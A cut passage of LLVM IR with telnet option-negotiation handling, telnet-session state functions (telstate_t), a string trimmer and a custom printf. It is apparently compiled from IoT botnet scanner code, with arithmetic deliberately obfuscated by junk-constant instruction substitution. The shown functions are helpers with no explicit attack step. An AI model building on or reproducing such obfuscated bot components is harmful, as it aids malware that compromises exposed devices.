  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %61 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %63

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %54

; <label>:23:                                     ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %53

; <label>:30:                                     ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %44

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 253
  %42 = select i1 %41, i32 251, i32 253
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %8, align 1
  br label %52

; <label>:44:                                     ; preds = %30
  %45 = load i8*, i8** %6, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 253
  %50 = select i1 %49, i32 252, i32 254
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %8, align 1
  br label %52

; <label>:52:                                     ; preds = %44, %36
  br label %53

; <label>:53:                                     ; preds = %52, %29
  br label %54

; <label>:54:                                     ; preds = %53, %22
  %55 = load i32, i32* %5, align 4
  %56 = call i64 @send(i32 %55, i8* %8, i64 1, i32 16384)
  %57 = load i32, i32* %5, align 4
  %58 = load i8*, i8** %6, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 2
  %60 = call i64 @send(i32 %57, i8* %59, i64 1, i32 16384)
  br label %62

; <label>:61:                                     ; preds = %3
  br label %62

; <label>:62:                                     ; preds = %61, %54
  store i32 0, i32* %4, align 4
  br label %63

; <label>:63:                                     ; preds = %62, %13
  %64 = load i32, i32* %4, align 4
  ret i32 %64
}

declare i64 @send(i32, i8*, i64, i32) #2

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #5
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #1

; Function Attrs: noinline nounwind uwtable
define void @advance_telstate(%struct.telstate_t*, i32) #0 {
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  %6 = icmp eq i32 %5, 0
  br i1 %6, label %7, label %12

; <label>:7:                                      ; preds = %2
  %8 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 8
  %11 = call i32 @close(i32 %10)
  br label %12

; <label>:12:                                     ; preds = %7, %2
  %13 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %14 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %13, i32 0, i32 7
  store i32 0, i32* %14, align 8
  %15 = load i32, i32* %4, align 4
  %16 = trunc i32 %15 to i8
  %17 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %18 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i32 0, i32 2
  store i8 %16, i8* %18, align 8
  %19 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %20 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i32 0, i32 9
  %21 = load i8*, i8** %20, align 8
  call void @llvm.memset.p0i8.i64(i8* %21, i8 0, i64 1024, i32 1, i1 false)
  ret void
}

declare i32 @close(i32) #2

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_telstate(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @trim2(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #9
  %8 = add i64 %7, -90412407692635409
  %9 = sub i64 %8, 1
  %10 = sub i64 %9, -90412407692635409
  %11 = sub i64 %7, 1
  %12 = trunc i64 %10 to i32
  store i32 %12, i32* %5, align 4
  br label %13

; <label>:13:                                     ; preds = %22, %1
  %14 = load i8*, i8** %2, align 8
  %15 = load i32, i32* %4, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds i8, i8* %14, i64 %16
  %18 = load i8, i8* %17, align 1
  %19 = sext i8 %18 to i32
  %20 = call i32 @isspace(i32 %19) #9
  %21 = icmp ne i32 %20, 0
  br i1 %21, label %22, label %29

; <label>:22:                                     ; preds = %13
  %23 = load i32, i32* %4, align 4
  %24 = sub i32 0, %23
  %25 = sub i32 0, 1
  %26 = add i32 %24, %25
  %27 = sub i32 0, %26
  %28 = add nsw i32 %23, 1
  store i32 %27, i32* %4, align 4
  br label %13

; <label>:29:                                     ; preds = %13
  br label %30

; <label>:30:                                     ; preds = %45, %29
  %31 = load i32, i32* %5, align 4
  %32 = load i32, i32* %4, align 4
  %33 = icmp sge i32 %31, %32
  br i1 %33, label %34, label %43

; <label>:34:                                     ; preds = %30
  %35 = load i8*, i8** %2, align 8
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %35, i64 %37
  %39 = load i8, i8* %38, align 1
  %40 = sext i8 %39 to i32
  %41 = call i32 @isspace(i32 %40) #9
  %42 = icmp ne i32 %41, 0
  br label %43

; <label>:43:                                     ; preds = %34, %30
  %44 = phi i1 [ false, %30 ], [ %42, %34 ]
  br i1 %44, label %45, label %50

; <label>:45:                                     ; preds = %43
  %46 = load i32, i32* %5, align 4
  %47 = sub i32 0, -1
  %48 = sub i32 %46, %47
  %49 = add nsw i32 %46, -1
  store i32 %48, i32* %5, align 4
  br label %30

; <label>:50:                                     ; preds = %43
  %51 = load i32, i32* %4, align 4
  store i32 %51, i32* %3, align 4
  br label %52

; <label>:52:                                     ; preds = %70, %50
  %53 = load i32, i32* %3, align 4
  %54 = load i32, i32* %5, align 4
  %55 = icmp sle i32 %53, %54
  br i1 %55, label %56, label %75

; <label>:56:                                     ; preds = %52
  %57 = load i8*, i8** %2, align 8
  %58 = load i32, i32* %3, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds i8, i8* %57, i64 %59
  %61 = load i8, i8* %60, align 1
  %62 = load i8*, i8** %2, align 8
  %63 = load i32, i32* %3, align 4
  %64 = load i32, i32* %4, align 4
  %65 = sub i32 0, %64
  %66 = add i32 %63, %65
  %67 = sub nsw i32 %63, %64
  %68 = sext i32 %66 to i64
  %69 = getelementptr inbounds i8, i8* %62, i64 %68
  store i8 %61, i8* %69, align 1
  br label %70

; <label>:70:                                     ; preds = %56
  %71 = load i32, i32* %3, align 4
  %72 = sub i32 0, 1
  %73 = sub i32 %71, %72
  %74 = add nsw i32 %71, 1
  store i32 %73, i32* %3, align 4
  br label %52

; <label>:75:                                     ; preds = %52
  %76 = load i8*, i8** %2, align 8
  %77 = load i32, i32* %3, align 4
  %78 = load i32, i32* %4, align 4
  %79 = add i32 %77, -782567487
  %80 = sub i32 %79, %78
  %81 = sub i32 %80, -782567487
  %82 = sub nsw i32 %77, %78
  %83 = sext i32 %81 to i64
  %84 = getelementptr inbounds i8, i8* %76, i64 %83
  store i8 0, i8* %84, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #4

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #5

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %342, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %345

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %331

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %345

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %332

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  br label %45

; <label>:45:                                     ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %70

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = xor i32 %53, -1
  %55 = xor i32 2, -1
  %56 = xor i32 -1905488819, -1
  %57 = and i32 %54, -1905488819
  %58 = and i32 %53, %56
  %59 = and i32 %55, -1905488819
  %60 = and i32 2, %56
  %61 = or i32 %57, %58
  %62 = or i32 %59, %60
  %63 = xor i32 %61, %62
  %64 = or i32 %54, %55
  %65 = xor i32 %64, -1
  %66 = or i32 -1905488819, %56
  %67 = and i32 %65, %66
  %68 = or i32 %63, %67
  %69 = or i32 %53, 2
  store i32 %68, i32* %8, align 4
  br label %45

; <label>:70:                                     ; preds = %45
  br label %71

; <label>:71:                                     ; preds = %98, %70
  %72 = load i8*, i8** %5, align 8
  %73 = load i8, i8* %72, align 1
  %74 = zext i8 %73 to i32
  %75 = icmp sge i32 %74, 48
  br i1 %75, label %76, label %81

; <label>:76:                                     ; preds = %71
  %77 = load i8*, i8** %5, align 8
  %78 = load i8, i8* %77, align 1
  %79 = zext i8 %78 to i32
  %80 = icmp sle i32 %79, 57
  br label %81

; <label>:81:                                     ; preds = %76, %71
  %82 = phi i1 [ false, %71 ], [ %80, %76 ]
  br i1 %82, label %83, label %101

; <label>:83:                                     ; preds = %81
  %84 = load i32, i32* %7, align 4
  %85 = mul nsw i32 %84, 10
  store i32 %85, i32* %7, align 4
  %86 = load i8*, i8** %5, align 8
  %87 = load i8, i8* %86, align 1
  %88 = zext i8 %87 to i32
  %89 = sub i32 %88, 1110111541
  %90 = sub i32 %89, 48
  %91 = add i32 %90, 1110111541
  %92 = sub nsw i32 %88, 48
  %93 = load i32, i32* %7, align 4
  %94 = sub i32 %93, -1102206456
  %95 = add i32 %94, %91
  %96 = add i32 %95, -1102206456
  %97 = add nsw i32 %93, %91
  store i32 %96, i32* %7, align 4
  br label %98

; <label>:98:                                     ; preds = %83
  %99 = load i8*, i8** %5, align 8
  %100 = getelementptr inbounds i8, i8* %99, i32 1
  store i8* %100, i8** %5, align 8
  br label %71

; <label>:101:                                    ; preds = %81
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 115
  br i1 %105, label %106, label %148

; <label>:106:                                    ; preds = %101
  %107 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %108 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %107, i32 0, i32 0
  %109 = load i32, i32* %108, align 8
  %110 = icmp ule i32 %109, 40
  br i1 %110, label %111, label %121

; <label>:111:                                    ; preds = %106
  %112 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %107, i32 0, i32 3
  %113 = load i8*, i8** %112, align 8
  %114 = getelementptr i8, i8* %113, i32 %109
  %115 = bitcast i8* %114 to i32*
  %116 = sub i32 0, %109
  %117 = sub i32 0, 8
  %118 = add i32 %116, %117
  %119 = sub i32 0, %118
  %120 = add i32 %109, 8
  store i32 %119, i32* %108, align 8
  br label %126

; <label>:121:                                    ; preds = %106
  %122 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %107, i32 0, i32 2
  %123 = load i8*, i8** %122, align 8
  %124 = bitcast i8* %123 to i32*
  %125 = getelementptr i8, i8* %123, i32 8
  store i8* %125, i8** %122, align 8
  br label %126

; <label>:126:                                    ; preds = %121, %111
  %127 = phi i32* [ %115, %111 ], [ %124, %121 ]
  %128 = load i32, i32* %127, align 4
  %129 = sext i32 %128 to i64
  %130 = inttoptr i64 %129 to i8*
  store i8* %130, i8** %11, align 8
  %131 = load i8**, i8*** %4, align 8
  %132 = load i8*, i8** %11, align 8
  %133 = icmp ne i8* %132, null
  br i1 %133, label %134, label %136

; <label>:134:                                    ; preds = %126
  %135 = load i8*, i8** %11, align 8
  br label %137

; <label>:136:                                    ; preds = %126
  br label %137

; <label>:137:                                    ; preds = %136, %134
  %138 = phi i8* [ %135, %134 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.327, i32 0, i32 0), %136 ]
  %139 = load i32, i32* %7, align 4
  %140 = load i32, i32* %8, align 4
  %141 = call i32 @prints(i8** %131, i8* %138, i32 %139, i32 %140)
  %142 = load i32, i32* %9, align 4
  %143 = sub i32 0, %142
  %144 = sub i32 0, %141
  %145 = add i32 %143, %144
  %146 = sub i32 0, %145
  %147 = add nsw i32 %142, %141
  store i32 %146, i32* %9, align 4
  br label %342

; <label>:148:                                    ; preds = %101
  %149 = load i8*, i8** %5, align 8
  %150 = load i8, i8* %149, align 1
  %151 = zext i8 %150 to i32
  %152 = icmp eq i32 %151, 100
  br i1 %152, label %153, label %184

; <label>:153:                                    ; preds = %148
  %154 = load i8**, i8*** %4, align 8
  %155 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %156 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %155, i32 0, i32 0
  %157 = load i32, i32* %156, align 8
  %158 = icmp ule i32 %157, 40
  br i1 %158, label %159, label %168

; <label>:159:                                    ; preds = %153
  %160 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %155, i32 0, i32 3
  %161 = load i8*, i8** %160, align 8
  %162 = getelementptr i8, i8* %161, i32 %157
  %163 = bitcast i8* %162 to i32*
  %164 = add i32 %157, 578636257
  %165 = add i32 %164, 8
  %166 = sub i32 %165, 578636257
  %167 = add i32 %157, 8
  store i32 %166, i32* %156, align 8
  br label %173

; <label>:168:                                    ; preds = %153
  %169 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %155, i32 0, i32 2
  %170 = load i8*, i8** %169, align 8
  %171 = bitcast i8* %170 to i32*
  %172 = getelementptr i8, i8* %170, i32 8
  store i8* %172, i8** %169, align 8
  br label %173

; <label>:173:                                    ; preds = %168, %159
  %174 = phi i32* [ %163, %159 ], [ %171, %168 ]
  %175 = load i32, i32* %174, align 4
  %176 = load i32, i32* %7, align 4
  %177 = load i32, i32* %8, align 4
  %178 = call i32 @printi(i8** %154, i32 %175, i32 10, i32 1, i32 %176, i32 %177, i32 97)
  %179 = load i32, i32* %9, align 4
  %180 = add i32 %179, 9188726
  %181 = add i32 %180, %178
  %182 = sub i32 %181, 9188726
  %183 = add nsw i32 %179, %178
  store i32 %182, i32* %9, align 4
  br label %342

; <label>:184:                                    ; preds = %148
  %185 = load i8*, i8** %5, align 8
  %186 = load i8, i8* %185, align 1
  %187 = zext i8 %186 to i32
  %188 = icmp eq i32 %187, 120
  br i1 %188, label %189, label %219

; <label>:189:                                    ; preds = %184
  %190 = load i8**, i8*** %4, align 8
  %191 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %192 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %191, i32 0, i32 0
  %193 = load i32, i32* %192, align 8
  %194 = icmp ule i32 %193, 40
  br i1 %194, label %195, label %204

; <label>:195:                                    ; preds = %189
  %196 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %191, i32 0, i32 3
  %197 = load i8*, i8** %196, align 8
  %198 = getelementptr i8, i8* %197, i32 %193
  %199 = bitcast i8* %198 to i32*
  %200 = add i32 %193, -622996434
  %201 = add i32 %200, 8
  %202 = sub i32 %201, -622996434
  %203 = add i32 %193, 8
  store i32 %202, i32* %192, align 8
  br label %209

; <label>:204:                                    ; preds = %189
  %205 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %191, i32 0, i32 2
  %206 = load i8*, i8** %205, align 8
  %207 = bitcast i8* %206 to i32*
  %208 = getelementptr i8, i8* %206, i32 8
  store i8* %208, i8** %205, align 8
  br label %209

; <label>:209:                                    ; preds = %204, %195
  %210 = phi i32* [ %199, %195 ], [ %207, %204 ]
  %211 = load i32, i32* %210, align 4
  %212 = load i32, i32* %7, align 4
  %213 = load i32, i32* %8, align 4
  %214 = call i32 @printi(i8** %190, i32 %211, i32 16, i32 0, i32 %212, i32 %213, i32 97)
  %215 = load i32, i32* %9, align 4
  %216 = sub i32 0, %214
  %217 = sub i32 %215, %216
  %218 = add nsw i32 %215, %214
  store i32 %217, i32* %9, align 4
  br label %342

; <label>:219:                                    ; preds = %184
  %220 = load i8*, i8** %5, align 8
  %221 = load i8, i8* %220, align 1
  %222 = zext i8 %221 to i32
  %223 = icmp eq i32 %222, 88
  br i1 %223, label %224, label %255

; <label>:224:                                    ; preds = %219
  %225 = load i8**, i8*** %4, align 8
  %226 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %227 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %226, i32 0, i32 0
  %228 = load i32, i32* %227, align 8
  %229 = icmp ule i32 %228, 40
  br i1 %229, label %230, label %238

; <label>:230:                                    ; preds = %224
  %231 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %226, i32 0, i32 3
  %232 = load i8*, i8** %231, align 8
  %233 = getelementptr i8, i8* %232, i32 %228
  %234 = bitcast i8* %233 to i32*
  %235 = sub i32 0, 8
  %236 = sub i32 %228, %235
  %237 = add i32 %228, 8
  store i32 %236, i32* %227, align 8
  br label %243

; <label>:238:                                    ; preds = %224
  %239 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %226, i32 0, i32 2
  %240 = load i8*, i8** %239, align 8
  %241 = bitcast i8* %240 to i32*
  %242 = getelementptr i8, i8* %240, i32 8
  store i8* %242, i8** %239, align 8
  br label %243

; <label>:243:                                    ; preds = %238, %230
  %244 = phi i32* [ %234, %230 ], [ %241, %238 ]
  %245 = load i32, i32* %244, align 4
  %246 = load i32, i32* %7, align 4
  %247 = load i32, i32* %8, align 4
  %248 = call i32 @printi(i8** %225, i32 %245, i32 16, i32 0, i32 %246, i32 %247, i32 65)
  %249 = load i32, i32* %9, align 4
  %250 = sub i32 0, %249
  %251 = sub i32 0, %248
  %252 = add i32 %250, %251
  %253 = sub i32 0, %252
  %254 = add nsw i32 %249, %248
  store i32 %253, i32* %9, align 4
  br label %342

; <label>:255:                                    ; preds = %219
  %256 = load i8*, i8** %5, align 8
  %257 = load i8, i8* %256, align 1
  %258 = zext i8 %257 to i32
  %259 = icmp eq i32 %258, 117
  br i1 %259, label %260, label %291

; <label>:260:                                    ; preds = %255
  %261 = load i8**, i8*** %4, align 8
  %262 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %263 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %262, i32 0, i32 0
  %264 = load i32, i32* %263, align 8
  %265 = icmp ule i32 %264, 40
  br i1 %265, label %266, label %275

; <label>:266:                                    ; preds = %260
  %267 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %262, i32 0, i32 3
  %268 = load i8*, i8** %267, align 8
  %269 = getelementptr i8, i8* %268, i32 %264
  %270 = bitcast i8* %269 to i32*
  %271 = sub i32 %264, -1166052046
  %272 = add i32 %271, 8
  %273 = add i32 %272, -1166052046
  %274 = add i32 %264, 8
  store i32 %273, i32* %263, align 8
  br label %280

; <label>:275:                                    ; preds = %260
  %276 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %262, i32 0, i32 2
  %277 = load i8*, i8** %276, align 8
  %278 = bitcast i8* %277 to i32*
  %279 = getelementptr i8, i8* %277, i32 8
  store i8* %279, i8** %276, align 8
  br label %280

; <label>:280:                                    ; preds = %275, %266
  %281 = phi i32* [ %270, %266 ], [ %278, %275 ]
  %282 = load i32, i32* %281, align 4
  %283 = load i32, i32* %7, align 4
  %284 = load i32, i32* %8, align 4
  %285 = call i32 @printi(i8** %261, i32 %282, i32 10, i32 0, i32 %283, i32 %284, i32 97)
  %286 = load i32, i32* %9, align 4
  %287 = add i32 %286, -1596777095
  %288 = add i32 %287, %285
  %289 = sub i32 %288, -1596777095
  %290 = add nsw i32 %286, %285
  store i32 %289, i32* %9, align 4
  br label %342

; <label>:291:                                    ; preds = %255
  %292 = load i8*, i8** %5, align 8
  %293 = load i8, i8* %292, align 1
  %294 = zext i8 %293 to i32
  %295 = icmp eq i32 %294, 99
  br i1 %295, label %296, label %330

; <label>:296:                                    ; preds = %291
  %297 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %298 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %297, i32 0, i32 0
  %299 = load i32, i32* %298, align 8
  %300 = icmp ule i32 %299, 40
  br i1 %300, label %301, label %310

; <label>:301:                                    ; preds = %296
  %302 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %297, i32 0, i32 3
  %303 = load i8*, i8** %302, align 8
  %304 = getelementptr i8, i8* %303, i32 %299
  %305 = bitcast i8* %304 to i32*
  %306 = add i32 %299, 237455681
  %307 = add i32 %306, 8
  %308 = sub i32 %307, 237455681
  %309 = add i32 %299, 8
  store i32 %308, i32* %298, align 8
  br label %315

; <label>:310:                                    ; preds = %296
  %311 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %297, i32 0, i32 2
  %312 = load i8*, i8** %311, align 8
  %313 = bitcast i8* %312 to i32*
  %314 = getelementptr i8, i8* %312, i32 8
  store i8* %314, i8** %311, align 8
  br label %315

; <label>:315:                                    ; preds = %310, %301
  %316 = phi i32* [ %305, %301 ], [ %313, %310 ]
  %317 = load i32, i32* %316, align 4
  %318 = trunc i32 %317 to i8
  %319 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %318, i8* %319, align 1
  %320 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %320, align 1
  %321 = load i8**, i8*** %4, align 8
  %322 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %323 = load i32, i32* %7, align 4
  %324 = load i32, i32* %8, align 4
  %325 = call i32 @prints(i8** %321, i8* %322, i32 %323, i32 %324)
  %326 = load i32, i32* %9, align 4
  %327 = sub i32 0, %325
  %328 = sub i32 %326, %327
  %329 = add nsw i32 %326, %325
  store i32 %328, i32* %9, align 4
  br label %342

; <label>:330:                                    ; preds = %291
  br label %341

; <label>:331:                                    ; preds = %17
  br label %332

; <label>:332:                                    ; preds = %331, %35
  %333 = load i8**, i8*** %4, align 8
  %334 = load i8*, i8** %5, align 8
  %335 = load i8, i8* %334, align 1
  %336 = zext i8 %335 to i32
  call void @printchar(i8** %333, i32 %336)
  %337 = load i32, i32* %9, align 4
  %338 = sub i32 0, 1
  %339 = sub i32 %337, %338
  %340 = add nsw i32 %337, 1
  store i32 %339, i32* %9, align 4
  br label %341

; <label>:341:                                    ; preds = %332, %330
  br label %342

; <label>:342:                                    ; preds = %341, %315, %280, %243, %209, %173, %137
  %343 = load i8*, i8** %5, align 8
  %344 = getelementptr inbounds i8, i8* %343, i32 1
  store i8* %344, i8** %5, align 8
  br label %12

; <label>:345:                                    ; preds = %29, %12
  %346 = load i8**, i8*** %4, align 8
  %347 = icmp ne i8** %346, null
  br i1 %347, label %348, label %351

; <label>:348:                                    ; preds = %345
  %349 = load i8**, i8*** %4, align 8
  %350 = load i8*, i8** %349, align 8
  store i8 0, i8* %350, align 1
  br label %351

; <label>:351:                                    ; preds = %348, %345
  %352 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %353 = bitcast %struct.__va_list_tag* %352 to i8*
  call void @llvm.va_end(i8* %353)
  %354 = load i32, i32* %9, align 4
  ret i32 %354
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %51

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %27, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %30

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = sub i32 %22, 786385194
  %24 = add i32 %23, 1
  %25 = add i32 %24, 786385194
  %26 = add nsw i32 %22, 1
  store i32 %25, i32* %11, align 4
  br label %27

; <label>:27:                                     ; preds = %21
  %28 = load i8*, i8** %12, align 8
